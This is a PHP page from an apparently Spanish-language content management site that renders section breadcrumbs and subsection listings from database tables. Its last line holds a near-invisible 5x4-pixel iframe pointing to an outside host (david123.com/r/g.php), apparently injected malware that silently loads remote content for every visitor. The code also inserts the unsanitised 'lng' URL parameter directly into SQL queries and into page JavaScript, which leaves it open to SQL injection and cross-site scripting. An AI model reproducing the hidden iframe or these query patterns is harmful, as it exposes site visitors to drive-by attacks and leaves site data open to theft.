<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$lng=$_GET['lng'];
	//$soc=$_GET['soc'];
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }

	global $prefijo_socio,$socio;
	
	$db->select('secciones','min(id_parent) as id_min');
	$row=$db->fetch_object();
	if($row->id_min != null){
		$id_min=$row->id_min;
	}
	else{
		$id_min=1;
	}

?>

<html><head>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
</head>
<?
	if($id_sel>-1){
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<td height="28" colspan="5" valign="top" class="espacio" >
<?
	$db1=new DBI;
	$w=$id_sel;
	$anidado_cod_ant=$id_min;

	$db->select('secciones','*',"id=$w and id>0 and lng='$lng'");
	if($db->num_rows()>0){
		$row=$db->fetch_object();
		$ww=$row->id_parent;
		$anidado[]=$row->titulo;
		$anidado_cod[]=$row->id;
	
		while($ww>0){
			$db->select('secciones','*',"id=$ww and lng='$lng'");
			while( $row=$db->fetch_object()){
				$anidado[]=$row->titulo;
				$anidado_descrip[]=$row->descrip;
				$anidado_cod[]=$row->id;
				$ww=$row->id_parent;
			}
		}
	}
	$links='';
	
	for($x=count($anidado)-1;$x>0;$x--){
		$links.="<a class='link2' onMouseOver='opcionover(this)' onMouseOut='opcionout(this)' href='#' onclick=\"atras('$anidado_cod[$x]')\"><img src='images/flechita1.gif' width='9' height='15' border=0>".$anidado[$x]."</a>&nbsp;&nbsp; ";
	}
	$links.="<span class='link3'><img src='images/flechita1.gif' width='9' height='15' border=0><b>".$anidado[0]."</b></span>";
	$titulo_actual=$anidado[0];
	echo $links;
	
	?>	
	
	</td>
</tr>
</table>
<table height="100%" width="100%" border="0" cellpadding="0" cellspacing="0">
<tr><td>&nbsp;</td></tr>
<tr valign="top">
<td width="0%" valign="top" height="100%">
<table border="0" cellpadding="0" cellspacing="0" width="95%" align="center">
	<form name="formframe" id='formframe' method="post">
	<input type="hidden" name="id_sel">
					<tr valign="top">
						<td>&nbsp;</td>
					   <td>&nbsp;</td>
					   <td>&nbsp;</td>
					   <td class="titulos">
							<div align="right"><?=$anidado[0]?>&nbsp;</div>
					   </td>
					</tr>
<?
	$db->select('secciones','*',"id_parent=$id_sel and lng='$lng'");
	if($db->num_rows()>0){
		while($row=$db->fetch_object()){
			if($row->id==$id_sel){
				$clase='botonesOVER';
			}
			else{
				$clase='botones';
			}
			$tmp['CAMPO_texto']='';
			$db1->select('contenidos','*',"id=$row->id and lng='$lng'");
			if($db1->num_rows()>0){
				while($row1=$db1->fetch_object()){
					$tmp[$row1->campo]=nl2br($row1->contenido);
				}
			}
			
			
?>
					<tr valign="top">
						<td colspan="4"><hr size="1" noshade color="#999999" width="100%"></td>
					</tr>
					<tr valign="top">
						<td valign="top" align="right" width="10"><div align="left"><img src="images/flechita1.gif" ></td></div>
						<td id="<?=$row->id?>" class="subtitulos" valign="top" width="160">
							<script> item_actual=<?=$row->id?></script>
							<a class="link2" id="<?=$row->id?>" href="#" onMouseOver="opcionover(this)" onMouseOut="opcionout(this)"  onClick="parent.document.getElementById('id_sel').value=this.id;document.formframe.id_sel.value=this.id;document.formframe.submit()"><?=$row->titulo?></a>
						</td>
						<td valign="top" width="10">&nbsp;</td>
						<td valign="top">
							<table width="100%" align="left"><tr><td class="contenido"><div align="justify"><?=$tmp['CAMPO_texto']?>
								</div>
							</td>
							</tr></table>
						</td>
					</tr>
<?
		}
	}
	else{
?>
					<tr valign="top">
						<td width="40" height="100%" valign="middle" align="right">&nbsp;</td>
						<td id="" width="140" class="">&nbsp;
							
					 	</td>
						<td width="30" height="22" valign="top"><?=$tmp['CAMPO_texto']?></td>
					</tr>
<?
	}
?>
</form>
</table>
</td>
<?
/*<td valign="top">

$db1=new DBI;
$db2=new DBI;
$db1->select('campos_pagina','*',"id=$id_sel","orden");
if($db1->num_rows()>0){
	while($row1=$db1->fetch_object()){
		$campo=$row1->campo;
		$estilo=$row1->estilo;
		$db2->select('contenidos','*',"id=$id_sel and campo='$campo' and lng='$lng'");
		if($db2->num_rows()>0){
			$row2=$db2->fetch_object();
			echo "<table class='".$estilo."' width='90%' align='center'><tr valign='top'><td>".nl2br($row2->contenido)."</td></tr></table>";
		}
		else{
			echo "<table class='".$estilo."' width='90%' align='center'><tr valign='top'><td>&nbsp;</td></tr></table>";
		}
	}
}
else{
	echo "<table class='".$estilo."' width='90%' align='center'><tr valign='top'><td>$id_sel id=$id_sel and campo='$campo' and lng='$lng'</td></tr></table>";
}
</td>*/

?>

</tr>
</table>
</td></tr></table>
<?
	}
	else{
	?>
		<script>
			parent.document.getElementById('iframearea').src="<?=$_SESSION['sociosel']?>home.html";
		</script>
	<?
	}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>
